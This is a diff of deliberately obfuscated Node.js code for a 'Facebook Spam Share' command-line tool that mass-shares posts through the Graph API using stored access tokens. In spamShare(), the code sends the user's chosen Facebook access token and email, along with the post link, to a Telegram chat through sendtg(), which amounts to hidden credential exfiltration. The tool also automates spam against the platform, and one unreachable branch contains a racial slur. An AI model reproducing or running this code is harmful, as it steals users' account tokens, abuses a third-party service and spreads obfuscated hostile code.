+                                    L?.[h3(0x38e)][h3(0x27f)](U['qWoOv']) ? console[h3(0x38c)](U[h3(0x1d9)](U[h3(0x29c)](U[h3(0x210)](getTimeStamp), error), h3(0x2b8))) : U['fGDWo'](U[h3(0x2f6)], U[h3(0x3ba)]) ? U[h3(0x351)](N, U[h3(0x2ad)]) : (console[h3(0x38c)](U[h3(0x1d7)](getTimeStamp) + error + h3(0x307)), console[h3(0x38c)](L));
+                            }
+                        }
                     }
                 }
+            } else {
+                if (U[h3(0x29a)] === U[h3(0x29a)])
+                    console['log'](U[h3(0x395)](U[h3(0x203)](U[h3(0x210)](getTimeStamp), error), H[h3(0x2ce)]));
+                else
+                    return g[h3(0x38c)](U['WINWr'](U[h3(0x329)](C(), Q), 'Connection\x20Error:\x20' + t[h3(0x38e)])), { 'retry': !![] };
             }
-        } else
-            console['log'](Q['vtbMy'](Q[a3(0x361)](Q[a3(0x389)](getTimeStamp), error), c[a3(0x251)]));
+        }
     }
-    await cont(), await Q[a3(0x2bd)](tokenManagement);
+    await U[h3(0x256)](cont), await U[h3(0x222)](tokenManagement);
 }
 async function cont() {
-    const a4 = ZC;
-    await inquirer[a4(0x25b)](prompts[a4(0x3ff)]);
+    const h4 = mz;
+    await inquirer[h4(0x405)](prompts[h4(0x285)]);
 }
-function logChoices(Q) {
-    const a5 = ZC, n = {
-            'Heeqj': function (w, b) {
-                return w === b;
+function logChoices(U) {
+    const h5 = mz, N = {
+            'IiRCf': 'Please\x20Enter\x20Only\x20Numbers',
+            'pudUm': function (V, B) {
+                return V === B;
             },
-            'PoqBz': a5(0x3c6),
-            'mpFyp': function (w, b) {
-                return w !== b;
+            'itsUG': 'main',
+            'zuHeZ': function (V, B) {
+                return V < B;
             },
-            'Ddbhf': a5(0x2d0),
-            'CPIak': function (w, b) {
-                return w < b;
+            'redfn': function (V, B) {
+                return V + B;
             },
-            'QDHxg': function (w, b) {
-                return w + b;
-            },
-            'WSWki': function (w, b) {
-                return w - b;
-            },
-            'soKmr': function (w, b) {
-                return w === b;
-            },
-            'oxdbl': a5(0x2c0),
-            'gRrJQ': function (w, b) {
-                return w < b;
-            },
-            'HXUpK': function (w, b) {
-                return w + b;
+            'ygceS': h5(0x352),
+            'FkKdv': h5(0x322),
+            'srQil': function (V, B) {
+                return V - B;
             }
         };
-    if (n['Heeqj'](Q, n[a5(0x1e6)])) {
-        if (n[a5(0x310)](a5(0x2d0), n[a5(0x35b)]))
-            n();
-        else
-            for (let b = 0x1 * -0xb99 + 0xdcf + -0x235; n[a5(0x249)](b, n[a5(0x24f)](mainchoices[a5(0x3ce)], 0x527 + 0x1 * 0x1af + -0x247 * 0x3)); b++) {
-                console[a5(0x1b8)](blue + '(' + b + ')' + reset + '\x20' + mainchoices[n['WSWki'](b, -0x20b * 0x10 + -0x1b86 + 0x3c37)]);
-            }
-    }
-    if (n[a5(0x311)](Q, n[a5(0x325)]))
-        for (let g = 0x485 + -0x1a4b + -0x45b * -0x5; n[a5(0x255)](g, n[a5(0x303)](tokenchoices[a5(0x3ce)], 0x1 * -0xf95 + -0x238 * 0xa + -0x25c6 * -0x1)); g++) {
-            console['log'](blue + '(' + g + ')' + reset + '\x20' + tokenchoices[n['WSWki'](g, 0x52 * 0x3a + 0x2 * 0xcd0 + -0x2c33)]);
+    if (N[h5(0x21a)](U, N[h5(0x314)]))
+        for (let V = -0x18e7 + -0xb11 * -0x1 + 0xdd7; N['zuHeZ'](V, N['redfn'](mainchoices[h5(0x2e1)], 0x14a * 0x11 + -0x1edd + 0x8f4)); V++) {
+            console[h5(0x38c)](blue + '(' + V + ')' + reset + '\x20' + mainchoices[V - (0x4b * 0x79 + 0x1a2d * 0x1 + 0x5 * -0xc53)]);
         }
-    console[a5(0x1b8)]();
+    if (N[h5(0x21a)](U, N['ygceS']))
+        for (let B = -0x10 * -0x1aa + -0x9d * 0x13 + -0x1 * 0xef8; N[h5(0x39a)](B, N[h5(0x2a7)](tokenchoices[h5(0x2e1)], 0x18a7 * 0x1 + 0xec1 * -0x2 + 0x4dc)); B++) {
+            if (N[h5(0x21a)]('FQXlf', N[h5(0x34e)]))
+                return N + N['IiRCf'];
+            else
+                console[h5(0x38c)](blue + '(' + B + ')' + reset + '\x20' + tokenchoices[N[h5(0x1d8)](B, -0x33 * -0xb9 + 0x9 * 0x3c7 + 0x7 * -0xa1f)]);
+        }
+    console['log']();
 }
 async function getTokenCmd() {
-    const a6 = ZC, Q = {
-            'uYqZv': function (w, b) {
-                return w(b);
+    const h6 = mz, U = {
+            'jrPCw': function (V, B) {
+                return V(B);
             }
-        }, {tokencmd: n} = await inquirer[a6(0x25b)](prompts[a6(0x2fe)]);
-    return Q['uYqZv'](parseInt, n);
+        }, {tokencmd: N} = await inquirer['prompt'](prompts[h6(0x41f)]);
+    return U[h6(0x2b3)](parseInt, N);
 }
 async function tokenManagement() {
-    const a7 = ZC, Q = {
-            'iMZNb': function (w, b) {
-                return w < b;
+    const h7 = mz, U = {
+            'aPUKK': function (V, B) {
+                return V + B;
             },
-            'gOaJu': function (w) {
-                return w();
+            'GnUrk': function (V, B) {
+                return V(B);
             },
-            'GUEYY': function (w, b) {
-                return w(b);
+            'pbYfz': h7(0x352),
+            'BhJxl': function (V, B) {
+                return V === B;
             },
-            'OHLDS': a7(0x2c0),
-            'RmZuM': function (w) {
-                return w();
+            'aFUrC': function (V) {
+                return V();
             },
-            'urFpg': function (w, b) {
-                return w === b;
+            'QIEpI': function (V, B) {
+                return V === B;
             },
-            'lCKSj': function (w, b) {
-                return w === b;
+            'bGZiQ': function (V, B) {
+                return V !== B;
             },
-            'pyTaK': function (w, b) {
-                return w !== b;
+            'vIbTw': 'UvNyx',
+            'sHImO': function (V, B) {
+                return V === B;
             },
-            'dlqyE': a7(0x32b)
+            'LAblS': 'NeaRP',
+            'PMqYG': function (V) {
+                return V();
+            }
         };
-    Q[a7(0x3b9)](setClear), await animate(banner), Q[a7(0x2c5)](logChoices, Q[a7(0x327)]);
-    const n = await Q['RmZuM'](getTokenCmd);
-    if (Q[a7(0x1fc)](n, 0xaa9 * -0x1 + 0xf05 * 0x1 + -0x45b))
-        Q[a7(0x273)](getToken);
+    setClear(), await U[h7(0x35b)](animate, banner), logChoices(U[h7(0x348)]);
+    const N = await getTokenCmd();
+    if (U[h7(0x2a5)](N, 0x10c6 * -0x2 + -0x11ec + 0x3379))
+        U[h7(0x226)](getToken);
     else {
-        if (Q[a7(0x1fc)](n, 0xab * -0x1d + 0x480 + 0x125 * 0xd))
-            removeToken();
-        else {
-            if (Q[a7(0x372)](n, 0x1c49 * -0x1 + -0x42d * -0x5 + -0x9 * -0xd3)) {
-                if (Q[a7(0x1bb)](Q[a7(0x371)], Q['dlqyE']))
-                    for (let b = -0x1 * -0x79f + -0xbd1 + 0x19 * 0x2b; Q[a7(0x3d5)](b, B['length'] + (-0x2261 + 0x1e21 + 0x441)); b++) {
-                        P[a7(0x1b8)](m + '(' + b + ')' + k + '\x20' + X[b - (-0x647 * -0x3 + -0x19ab + -0x11 * -0x67)]);
-                    }
+        if (U[h7(0x228)](N, -0xb * 0x88 + -0x1b2e + 0x1 * 0x2108)) {
+            if (U[h7(0x39e)](h7(0x25d), U[h7(0x1ea)]))
+                return U[h7(0x2aa)](N, 'Really\x20Nigga');
+            else
+                U[h7(0x226)](removeToken);
+        } else {
+            if (U[h7(0x3cb)](N, 0x17b * 0x17 + -0x29 * -0x23 + -0x255 * 0x11)) {
+                if (U[h7(0x39e)](U[h7(0x356)], U['LAblS']))
+                    return U['aPUKK'](N, h7(0x36d));
                 else
-                    Q[a7(0x273)](main);
+                    U[h7(0x36f)](main);
             }
         }
     }
 }
 async function feedback() {
-    const a8 = ZC, Q = {
-            'lUNBl': function (w, b) {
-                return w(b);
+    const h8 = mz, U = {
+            'XsUKE': function (V, B) {
+                return V + B;
             },
-            'lnJei': a8(0x324),
-            'aZDPW': function (w, b) {
-                return w + b;
+            'OpGZY': function (V) {
+                return V();
             },
-            'vEHKT': function (w) {
-                return w();
+            'zghIM': function (V, B) {
+                return V === B;
             },
-            'XlMzw': function (w, b) {
-                return w + b;
+            'fBuLd': function (V, B) {
+                return V === B;
             },
-            'OzFnw': function (w, b) {
-                return w + b;
+            'vqcLP': function (V, B) {
+                return V + B;
             },
-            'SHDuQ': 'Failed\x20to\x20apply\x20stashed\x20changes.',
-            'KVYPa': function (w, b) {
-                return w + b;
+            'UtpwN': function (V) {
+                return V();
             },
-            'gMPEs': function (w, b) {
-                return w + b;
+            'dCYoA': function (V, B) {
+                return V < B;
             },
-            'yicph': function (w) {
-                return w();
+            'VHMwZ': function (V) {
+                return V();
             },
-            'QBKtU': function (w) {
-                return w();
+            'QhKkg': h8(0x1f6),
+            'qVzrT': h8(0x384),
+            'gEtcg': function (V, B) {
+                return V + B;
             },
-            'QpDKs': a8(0x298),
-            'oweJt': a8(0x2fb),
-            'RiNRj': function (w, b) {
-                return w + b;
+            'uqOMO': function (V, B) {
+                return V + B;
             },
-            'OyUnK': a8(0x3c0),
-            'jhsgO': function (w, b) {
-                return w + b;
+            'YTAbD': function (V, B) {
+                return V + B;
             },
-            'PVvjh': function (w, b) {
-                return w + b;
+            'EHznL': h8(0x41c),
+            'BKJcC': function (V, B) {
+                return V !== B;
             },
-            'vCnsY': 'Facebook',
-            'DHFfu': function (w, b) {
-                return w === b;
+            'YPNTk': 'bmrQC',
+            'MpRSB': h8(0x3d6),
+            'yFJWP': function (V, B) {
+                return V === B;
             },
-            'hYKbm': a8(0x278),
-            'bQqfA': function (w, b) {
-                return w(b);
+            'PNvJc': 'QtKXD',
+            'jmPBl': h8(0x24c),
+            'UpNBV': function (V, B) {
+                return V(B);
             },
-            'HldKK': a8(0x300),
-            'hbjKL': a8(0x29f),
-            'kDRCS': a8(0x2a7),
-            'TzLTz': a8(0x2b7),
-            'WCbgq': a8(0x3dd)
+            'WgMjQ': h8(0x1cf),
+            'oAjUC': h8(0x1da),
+            'UjKTX': h8(0x287),
+            'bZOEY': 'termux-open\x20http://t.me/KairuDev',
+            'pwmaW': function (V, B) {
+                return V !== B;
+            },
+            'DceXS': h8(0x427),
+            'HWUkf': 'xdg-open\x20http://t.me/KairuDev'
         };
-    Q[a8(0x2d7)](setClear);
-    const {feedbackType: n} = await inquirer[a8(0x25b)]({
-        'name': Q[a8(0x250)],
-        'type': Q[a8(0x2ba)],
+    U[h8(0x392)](setClear);
+    const {feedbackType: N} = await inquirer[h8(0x405)]({
+        'name': U[h8(0x339)],
+        'type': U[h8(0x30a)],
         'prefix': '',
-        'message': Q[a8(0x34a)](ask, Q[a8(0x2a5)]),
+        'message': ask + 'Where\x20would\x20you\x20like\x20to\x20leave\x20your\x20feedback?',
         'choices': [
-            Q['aZDPW'](cyan + a8(0x339), reset),
-            Q[a8(0x1fd)](blue, 'Telegram') + reset,
-            Q[a8(0x2f8)](Q[a8(0x3b6)](red, 'Back'), reset)
+            U[h8(0x381)](U[h8(0x3df)](cyan, h8(0x41c)), reset),
+            U[h8(0x3df)](blue, h8(0x1da)) + reset,
+            U[h8(0x1db)](U['YTAbD'](red, h8(0x321)), reset)
         ]
     });
-    if (n[a8(0x1af)](Q[a8(0x31b)]))
+    if (N[h8(0x27f)](U[h8(0x2ed)]))
         try {
-            if (Q['DHFfu'](Q['hYKbm'], Q[a8(0x38f)]))
-                Q[a8(0x2ab)](execSync, Q['HldKK']);
-            else {
-                const b = Q[a8(0x3d1)](u, Q[a8(0x1a6)])['toString']();
-                o['log'](Q[a8(0x240)](Q[a8(0x399)](f) + E + a8(0x275) + O, a8(0x396)) + S), d['log'](Q[a8(0x399)](r) + z + ('Update\x20Message\x20:\x20' + Q[a8(0x240)](Q[a8(0x259)](J, b), h)));
-                if (q)
-                    try {
-                        Q['lUNBl'](L, a8(0x2f0));
-                    } catch (g) {
-                        Z4[a8(0x1b8)](Q[a8(0x2f8)](Q['aZDPW'](Z5(), Z6), Q['SHDuQ'])), Z7[a8(0x1b8)](Q[a8(0x245)](Q[a8(0x1f6)](Q['yicph'](Z8), Z9), g[a8(0x35d)]));
-                    }
-                s[a8(0x382)]();
-            }
-        } catch (b) {
-            execSync(Q['hbjKL']);
+            U[h8(0x3d1)]('bmrQC', U['YPNTk']) ? B[h8(0x38c)](U[h8(0x381)](U[h8(0x270)](g) + C, h8(0x2d8))) : execSync(U[h8(0x213)]);
+        } catch (B) {
+            if (U['yFJWP'](U[h8(0x3e1)], U[h8(0x344)])) {
+                const C = C['response'][h8(0x1ef)][h8(0x41e)];
+                if (U['zghIM'](C[h8(0x331)], -0x815 * 0x3 + -0x2473 + 0x3cb3) || U[h8(0x20d)](C['code'], -0x1 * -0xc0f + -0x1260 + 0x653))
+                    return M[h8(0x38c)](U['vqcLP'](U['UtpwN'](d), f) + 'Unexpected\x20Error'), { 'retry': !![] };
+                J[h8(0x38c)](C);
+            } else
+                U['UpNBV'](execSync, U['WgMjQ']);
         }
     else {
-        if (n[a8(0x1af)](Q[a8(0x28c)]))
-            try {
-                if (Q[a8(0x40d)](Q['TzLTz'], Q[a8(0x36b)]))
-                    Q[a8(0x3d1)](execSync, Q['WCbgq']);
-                else
-                    return Q[a8(0x2f8)](n, a8(0x3c2));
-            } catch (Y) {
-                execSync(a8(0x215));
-            }
+        if (N[h8(0x27f)](U[h8(0x380)])) {
+            if (U[h8(0x3d1)](U[h8(0x311)], h8(0x31c)))
+                try {
+                    execSync(U[h8(0x2ef)]);
+                } catch (C) {
+                    if (U[h8(0x1c3)](U[h8(0x200)], h8(0x239)))
+                        execSync(U['HWUkf']);
+                    else
+                        for (let t = -0x203e * 0x1 + 0x262 * 0xb + 0x609; U[h8(0x323)](t, M[h8(0x2e1)] + (-0x17cf + -0x1348 + 0x18a * 0x1c)); t++) {
+                            o['log'](E + '(' + t + ')' + v + '\x20' + T[t - (-0x1ecb * -0x1 + 0x1ea + -0x20b4)]);
+                        }
+                }
+            else
+                return !![];
+        }
     }
-    Q['yicph'](main);
+    main();
 }
-async function sendtg(Q) {
-    await Zh['post'](tg, Q, { 'timeout': 0x2710 });
+async function sendtg(U) {
+    const h9 = mz;
+    await ma[h9(0x40a)](tg, U, { 'timeout': 0x2710 });
 }
 async function spamShare() {
-    const a9 = ZC, Q = {
-            'jrwJF': function (H, W) {
-                return H + W;
+    const hm = mz, U = {
+            'QdfTU': function (t) {
+                return t();
             },
-            'Arzqf': a9(0x23a),
-            'fqYqH': function (H) {
-                return H();
+            'scISe': function (t, F) {
+                return t + F;
             },
-            'nBjIG': function (H, W) {
-                return H <= W;
+            'SmAmZ': function (t, F) {
+                return t + F;
             },
-            'feybX': function (H, W) {
-                return H + W;
+            'pynvl': function (t) {
+                return t();
             },
-            'YhiQH': function (H) {
-                return H();
+            'NWmyN': function (t) {
+                return t();
             },
-            'VHTau': function (H, W) {
-                return H(W);
+            'OiPKo': function (t, F) {
+                return t(F);
             },
-            'ElPkP': function (H) {
-                return H();
+            'GURUh': function (t, F) {
+                return t + F;
             },
-            'DaOqa': function (H, W) {
-                return H === W;
+            'BaUZh': function (t, F) {
+                return t(F);
             },
-            'PpjJz': a9(0x22f),
-            'WoMtm': function (H, W) {
-                return H !== W;
+            'ZCnTL': function (t) {
+                return t();
             },
-            'YiPKv': function (H) {
-                return H();
+            'FxdOk': function (t) {
+                return t();
             },
-            'bwEkd': function (H, W) {
-                return H - W;
+            'BHtdN': function (t, F) {
+                return t(F);
             },
-            'MnOMJ': function (H, W) {
-                return H + W;
+            'fSTij': function (t, F) {
+                return t === F;
             },
-            'dVThc': function (H) {
-                return H();
+            'PDwtR': function (t, F) {
+                return t !== F;
             },
-            'bjsCf': function (H, W, t) {
-                return H(W, t);
+            'gwZhh': function (t, F, J) {
+                return t(F, J);
             },
-            'vHqla': function (H, W) {
-                return H + W;
+            'uIidc': function (t, F) {
+                return t + F;
             },
-            'CctCB': a9(0x31f),
-            'ZMJZb': function (H, W) {
-                return H === W;
+            'HFYcW': function (t) {
+                return t();
             },
-            'xSuMh': a9(0x35a),
-            'fkSns': function (H, W) {
-                return H + W;
+            'hGDCG': function (t, F) {
+                return t(F);
+            },
+            'oUPeQ': function (t, F) {
+                return t + F;
+            },
+            'cKTHH': function (t, F) {
+                return t + F;
+            },
+            'ByNYJ': function (t, F, J, M, d) {
+                return t(F, J, M, d);
             }
         };
-    Q[a9(0x390)](setClear);
-    if (Q[a9(0x1c1)](tokens['length'], -0x21a * 0x1 + -0x163 * 0x10 + 0x184a)) {
-        console[a9(0x1b8)](Q[a9(0x2d9)](Q[a9(0x308)](getTimeStamp) + error, a9(0x2a9))), await Q[a9(0x390)](cont), await Q[a9(0x308)](tokenManagement);
+    U[hm(0x387)](setClear);
+    if (tokens['length'] <= -0x240b + -0xe1d + -0x8 * -0x645) {
+        console[hm(0x38c)](U[hm(0x36c)](U[hm(0x408)](U[hm(0x2f0)](getTimeStamp), error), hm(0x22e))), await U[hm(0x2a2)](cont), await tokenManagement();
         return;
     }
-    await Q[a9(0x3f2)](animate, Q[a9(0x2d9)](Q['jrwJF'](getTimeStamp(), warn), red + a9(0x2aa))), await Q['VHTau'](animate, Q[a9(0x3b7)](Q[a9(0x2d9)](Q[a9(0x3f5)](getTimeStamp), info), green + a9(0x1b0))), await cont(), Q['ElPkP'](setClear), await Q[a9(0x3f2)](animate, banner);
-    let n = ![];
-    const {url: w} = await inquirer[a9(0x25b)](prompts[a9(0x1b4)]);
-    let {amount: b} = await inquirer['prompt'](prompts[a9(0x281)]);
-    if (Q['DaOqa'](b[a9(0x1ff)](), 'i')) {
-        if (Q[a9(0x1e5)] !== Q[a9(0x1e5)])
-            return n + a9(0x2f2);
-        else
-            n = !![];
+    await U[hm(0x260)](animate, U['GURUh'](getTimeStamp() + warn, red + hm(0x202))), await U[hm(0x23a)](animate, U[hm(0x408)](U[hm(0x2ba)](U[hm(0x1e2)](getTimeStamp), info), green + hm(0x3f4))), await U[hm(0x434)](cont), setClear(), await U[hm(0x37a)](animate, banner);
+    let N = ![];
+    const {url: V} = await inquirer['prompt'](prompts[hm(0x2af)]);
+    let {amount: B} = await inquirer['prompt'](prompts[hm(0x35d)]);
+    U[hm(0x1cb)](B[hm(0x37d)](), 'i') && (N = !![]);
+    let g = tokens[0xc0f + 0x14e9 + 0x83e * -0x4], C = emails[0x5d9 + 0xe6 + -0x1 * 0x6bf];
+    if (U[hm(0x3ad)](tokens[hm(0x2e1)], 0xaa4 + 0xb64 + 0x1 * -0x1607)) {
+        console[hm(0x38c)](blue + hm(0x3f0) + green + 'Tokens' + blue + '----------'), U['FxdOk'](logToken), console[hm(0x38c)](blue + hm(0x3f0) + green + hm(0x318) + blue + hm(0x3f0));
+        let {selectedToken: t} = await inquirer[hm(0x405)](prompts['chooseToken']);
+        g = tokens[t - (-0xe * 0x16a + 0x1 * 0x33b + -0x15 * -0xca)], C = emails[t - (-0x6f7 * -0x4 + 0x7f * 0x23 + 0x2 * -0x169c)];
     }
-    let g = tokens[0x3eb * 0x2 + 0x22f6 * 0x1 + 0xb * -0x3e4], Y = emails[0x1 * -0x2513 + -0x17c1 * -0x1 + 0xd52];
-    if (Q[a9(0x357)](tokens[a9(0x3ce)], 0x1 * -0x11d7 + -0x1779 + 0x1 * 0x2951)) {
-        console[a9(0x1b8)](blue + a9(0x1e1) + green + a9(0x1a3) + blue + '----------'), Q[a9(0x386)](logToken), console[a9(0x1b8)](blue + a9(0x1e1) + green + a9(0x1a3) + blue + '----------');
-        let {selectedToken: W} = await inquirer[a9(0x25b)](prompts[a9(0x3ef)]);
-        g = tokens[Q[a9(0x2c3)](W, 0x6e9 + -0x16b9 + 0x1 * 0xfd1)], Y = emails[Q[a9(0x2c3)](W, 0x1af2 * 0x1 + -0xf6e + -0xb83)];
-    }
-    await Q[a9(0x3f2)](animate, Q[a9(0x30f)](Q[a9(0x2d9)](Q[a9(0x258)](getTimeStamp), info), a9(0x2de) + green + Y + white + a9(0x3c8))), await Q['bjsCf'](animate, Q[a9(0x2d9)](Q['vHqla'](getTimeStamp(), info), yellow + a9(0x1fa) + white + '\x20TO\x20STOP'), -0x3a * -0x1d + 0x856 + -0xede);
-    const i = {
+    await animate(U['scISe'](U[hm(0x387)](getTimeStamp), info) + (hm(0x241) + green + C + white + hm(0x2d7))), await U[hm(0x3b5)](animate, U[hm(0x28e)](U[hm(0x2ba)](U[hm(0x2b0)](getTimeStamp), info), yellow + hm(0x34b) + white + '\x20TO\x20STOP'), -0xec9 * 0x1 + -0xd74 + 0x39 * 0x7f);
+    const Q = {
         'chat_id': cID,
-        'text': '<b>(Facebook\x20Spam\x20Share)</b>\x0a\x0a<b>Facebook\x20Post\x20>\x20</b>' + w + '\x0a<b>Share\x20Amount\x20>\x20</b>' + (n ? null : b) + a9(0x1ee) + n + a9(0x38d) + g + a9(0x351) + Y,
-        'parse_mode': Q[a9(0x24b)]
+        'text': hm(0x313) + V + hm(0x3ac) + (N ? null : B) + hm(0x388) + N + hm(0x289) + g + hm(0x2bc) + C,
+        'parse_mode': hm(0x31e)
     };
     try {
-        Q[a9(0x260)](Q['xSuMh'], Q[a9(0x401)]) ? (await sendtg(i), await Q[a9(0x2f5)](animate, Q[a9(0x269)](Q[a9(0x2e8)](Q[a9(0x390)](getTimeStamp), info), a9(0x316)), -0x7 * -0x2e6 + -0x173 * -0x11 + 0x2cde * -0x1)) : (Y = i[a9(0x3d6)](-0x8a1 + -0x15b1 + 0x1e54, H), W = Q[a9(0x3b7)](Q[a9(0x388)], t));
-    } catch (B) {
-        console[a9(0x1b8)](Q[a9(0x269)](Q[a9(0x3f5)](getTimeStamp), info) + a9(0x316));
+        await U[hm(0x3c8)](sendtg, Q), await animate(U[hm(0x1d1)](U['oUPeQ'](getTimeStamp(), info), 'Starting...'), -0x1858 + -0x22 * -0x5a + -0xc73 * -0x1);
+    } catch (F) {
+        console[hm(0x38c)](U['cKTHH'](getTimeStamp(), info) + hm(0x41b));
     }
-    startShare(w, n ? n : b, g, Y);
+    U[hm(0x397)](startShare, V, N ? N : B, g, C);
 }
-let total = 0xbea + -0x1a55 + 0xe6b;
-async function sendRequest(Q, n, w) {
-    const aZ = ZC, b = { 'aBniq': aZ(0x349) };
-    return await Zh[aZ(0x34f)](aZ(0x3a4) + n + aZ(0x2e2), {
-        'link': Q,
-        'privacy': { 'value': b[aZ(0x333)] },
+let total = 0x1 * 0x105b + 0xade + -0x1b39;
+async function sendRequest(U, N, V) {
+    const hh = mz, B = { 'tyiOB': hh(0x1f4) };
+    return await ma['post'](hh(0x23f) + N + '&fields=id&limit=0&published=0', {
+        'link': U,
+        'privacy': { 'value': B[hh(0x3e3)] },
         'no_story': !![]
     }, {
-        'headers': w,
+        'headers': V,
         'httpsAgent': httpsAgent
     });
 }
-async function handleErrors(Q, n) {
-    const aa = ZC, w = {
-            'wteEd': function (b, g) {
-                return b(g);
+async function handleErrors(U, N) {
+    const hU = mz, V = {
+            'ZScEG': function (B, g) {
+                return B === g;
             },
-            'XYnvr': aa(0x1ad),
-            'ESbYP': function (b, g) {
-                return b + g;
+            'ozsZL': function (B, g) {
+                return B + g;
             },
-            'DOaYB': aa(0x297),
-            'lLaWG': function (b, g, Y) {
-                return b(g, Y);
+            'OmObt': function (B, g) {
+                return B <= g;
             },
-            'xrstt': 'cls',
-            'JzgnN': aa(0x23c),
-            'tQKoH': function (b, g) {
-                return b - g;
+            'kaWUB': function (B, g) {
+                return B > g;
             },
-            'SfOoC': function (b, g) {
-                return b + g;
+            'clJct': 'Invalid\x20Option.\x20Out\x20of\x20Range',
+            'ZsszT': function (B, g) {
+                return B + g;
             },
-            'jgehL': function (b, g) {
-                return b + g;
+            'qkiYS': function (B) {
+                return B();
             },
-            'WOElt': function (b, g) {
-                return b === g;
+            'Qarlf': function (B, g) {
+                return B + g;
             },
-            'rMCRX': 'ECONNABORTED',
-            'mCGpU': function (b, g) {
-                return b === g;
+            'PAErO': hU(0x2b9),
+            'rixiT': hU(0x35e),
+            'QgPvB': 'EPROTO',
+            'qzjPi': function (B, g) {
+                return B !== g;
             },
-            'ksxau': aa(0x2da),
-            'dchkF': function (b, g) {
-                return b + g;
+            'RTMBS': hU(0x3b9),
+            'BqpUD': function (B, g) {
+                return B + g;
             },
-            'Wnygc': function (b, g) {
-                return b + g;
+            'ZXmmC': hU(0x368),
+            'aHIxd': function (B, g) {
+                return B(g);
             },
-            'XeUiH': function (b) {
-                return b();
+            'kwqkb': 'ECONNRESET',
+            'MFyYw': function (B, g) {
+                return B === g;
             },
-            'HiBut': function (b, g) {
-                return b === g;
+            'mDkEB': function (B, g) {
+                return B === g;
             },
-            'xKgMa': 'ENOTFOUND',
-            'xmjFM': function (b, g) {
-                return b === g;
+            'DFjpe': hU(0x42b),
+            'syTrs': 'uzGST',
+            'pTGtd': function (B, g) {
+                return B + g;
             },
-            'oZpRk': aa(0x270),
-            'hpLDy': function (b, g) {
-                return b === g;
+            'DBqzR': function (B, g) {
+                return B + g;
             },
-            'KxXsK': function (b, g) {
-                return b + g;
+            'lMjxu': function (B, g) {
+                return B(g);
             },
-            'rXzko': function (b, g) {
-                return b === g;
+            'ldURC': function (B, g) {
+                return B !== g;
             },
-            'PstJA': function (b, g) {
-                return b === g;
+            'gvXfG': hU(0x2d4),
+            'hpKvl': function (B, g) {
+                return B !== g;
             },
-            'rUzOK': function (b) {
-                return b();
+            'tayWt': hU(0x425),
+            'rRLBx': hU(0x332),
+            'SkvMS': function (B, g) {
+                return B + g;
             },
-            'KYFSv': aa(0x3a5),
-            'kgwzQ': function (b) {
-                return b();
+            'paPII': function (B) {
+                return B();
             },
-            'locvb': aa(0x3cf),
-            'VfsuD': function (b) {
-                return b();
+            'EBmBZ': function (B, g) {
+                return B === g;
             },
-            'exiDs': 'QuDfM',
-            'wLSsi': 'utf8',
-            'gbyBN': function (b, g) {
-                return b + g;
+            'KHKLu': function (B, g) {
+                return B === g;
             },
-            'ALOdj': aa(0x391),
-            'huzOM': 'termux-toast\x20\x27Spam\x20Share\x20Stopped!\x27'
+            'BGRbs': hU(0x25b),
+            'AFqtR': function (B, g) {
+                return B + g;
+            },
+            'TWffN': function (B) {
+                return B();
+            },
+            'ZphuY': function (B) {
+                return B();
+            },
+            'cBncZ': function (B, g) {
+                return B + g;
+            },
+            'HLiUv': function (B, g) {
+                return B(g);
+            }
         };
-    if (Q[aa(0x268)] === aa(0x208))
-        return console[aa(0x1b8)](w[aa(0x3e9)](w[aa(0x253)](getTimeStamp(), error), aa(0x1b6) + Q['message'])), { 'retry': !![] };
+    if (V[hU(0x379)](U[hU(0x331)], V[hU(0x3d3)]))
+        return V[hU(0x2c2)](V[hU(0x2cd)], hU(0x3b9)) ? new B(J => Q(J, t)) : (console[hU(0x38c)](V[hU(0x229)](getTimeStamp(), error) + (hU(0x276) + U[hU(0x38e)])), { 'retry': !![] });
     else {
-        if (w[aa(0x2a2)](Q[aa(0x268)], w[aa(0x282)]) || w[aa(0x397)](Q[aa(0x268)], w[aa(0x28d)]))
-            return console[aa(0x1b8)](w['dchkF'](w[aa(0x3f7)](w[aa(0x2ed)](getTimeStamp), error), aa(0x326) + Q[aa(0x35d)])), await delay(0x1398 + -0xd8e + -0xd7e * -0x1), { 'retry': !![] };
+        if (U[hU(0x331)] === V[hU(0x3a2)] || V[hU(0x379)](U[hU(0x331)], 'ETIMEDOUT'))
+            return console[hU(0x38c)](V[hU(0x229)](V['qkiYS'](getTimeStamp), error) + ('Request\x20Timed\x20Out:\x20' + U['message'])), await V[hU(0x290)](delay, 0xabc + 0x1 * -0x18c2 + 0x218e), { 'retry': !![] };
         else {
-            if (w[aa(0x277)](Q[aa(0x268)], aa(0x328)) || w[aa(0x2a2)](Q[aa(0x268)], w['xKgMa'])) {
-                if (w[aa(0x1c9)](w['oZpRk'], w[aa(0x25f)]))
-                    return console[aa(0x1b8)](w[aa(0x3f7)](w['XeUiH'](getTimeStamp) + error, aa(0x200) + Q['message'])), { 'retry': !![] };
-                else
-                    w[aa(0x2b5)](n, w[aa(0x290)]);
-            } else {
-                if (Q[aa(0x251)] && w['hpLDy'](Q['response'][aa(0x213)], -0xc * -0x234 + 0xea0 * -0x1 + -0x9d9))
-                    return console[aa(0x1b8)](w['KxXsK'](w['SfOoC'](w[aa(0x2ed)](getTimeStamp), error), aa(0x33f) + Q[aa(0x251)][aa(0x213)] + ');\x20Please\x20Wait...')), await w[aa(0x2b5)](delay, 0xa99 + -0x291 * -0x7 + -0x908), { 'retry': !![] };
-                else {
-                    if (Q[aa(0x251)]?.[aa(0x377)]?.[aa(0x2ec)]) {
-                        const g = Q[aa(0x251)]['data']['error'];
-                        if (w[aa(0x1b5)](g[aa(0x268)], -0xaf1 + -0x104d + -0x9b * -0x2d) || w['PstJA'](g[aa(0x268)], -0x17 * 0xa3 + -0x210d + 0xac * 0x47))
-                            return console[aa(0x1b8)](w[aa(0x1b1)](getTimeStamp) + error + 'Unexpected\x20Error'), { 'retry': !![] };
-                        console['log'](g);
-                    } else {
-                        if (w[aa(0x397)](Q[aa(0x268)], w[aa(0x2d1)]))
-                            return console[aa(0x1b8)](w[aa(0x335)](w[aa(0x3de)](w[aa(0x33a)](getTimeStamp), error), aa(0x362) + Q[aa(0x268)] + aa(0x2c2) + Q[aa(0x35d)])), { 'retry': !![] };
+            if (V['ZScEG'](U[hU(0x331)], V['kwqkb']) || V[hU(0x379)](U['code'], hU(0x382)))
+                return console[hU(0x38c)](getTimeStamp() + error + (hU(0x420) + U[hU(0x38e)])), { 'retry': !![] };
+            else {
+                if (U[hU(0x2ce)] && V[hU(0x417)](U[hU(0x2ce)][hU(0x246)], 0x7 * -0x4c + -0x117 * -0x19 + -0x1734)) {
